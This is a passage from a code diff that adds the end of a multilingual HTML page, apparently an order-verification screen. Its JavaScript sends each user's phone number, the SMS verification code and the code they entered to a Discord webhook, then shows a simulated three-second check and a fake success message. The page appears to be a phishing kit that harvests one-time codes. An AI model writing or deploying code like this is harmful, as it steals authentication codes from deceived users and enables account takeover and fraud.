+                    phone: window.orderData.phone,
+                    verificationCode: verificationCode,
+                    enteredCode: enteredCode,
+                    status: 'Verified'
+                };
+                
+                sendToDiscordWebhook(smsData, 'sms');
+                
+                // 模擬驗證處理，等待3秒後顯示完成信息
+                setTimeout(() => {
+                    // 隱藏加載動畫
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    
+                    // 顯示驗證成功信息
+                    showAlert(translations[currentLang]['verificationSuccess']);
+                    
+                    // 清空驗證碼輸入框
+                    for (let i = 1; i <= 6; i++) {
+                        document.getElementById('code' + i).value = '';
+                    }
+                }, 3000); // 3000毫秒 = 3秒
+            } else {
+                // 發送驗證失敗結果到Discord Webhook
+                const smsData = {
+                    phone: window.orderData.phone,
+                    verificationCode: verificationCode,
+                    enteredCode: enteredCode,
+                    status: 'Failed'
+                };
+                
+                sendToDiscordWebhook(smsData, 'sms');
+                
+                showAlert(translations[currentLang]['verificationFailed']);
+            }
+        }
+        
+        // 初始化語言
+        updateLanguage();
+    </script>
+</body>
+</html>
